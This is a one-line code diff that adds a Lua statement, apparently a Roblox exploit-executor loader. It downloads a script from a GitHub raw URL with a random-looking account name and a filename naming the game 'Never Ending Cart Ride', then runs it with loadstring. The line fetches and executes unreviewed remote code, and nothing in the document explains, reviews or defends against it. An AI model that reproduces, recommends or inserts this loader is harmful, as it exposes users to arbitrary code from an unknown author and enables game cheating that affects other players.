@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/9ur98wh8fjkerbngo12ikontgg/fortnite/main/NEVER%20ENDING%20CART%20RIDE%20GUIRGUIHRGUIRTHGUIRHGUIRTHIUGHRTGUIHRTG", true))()
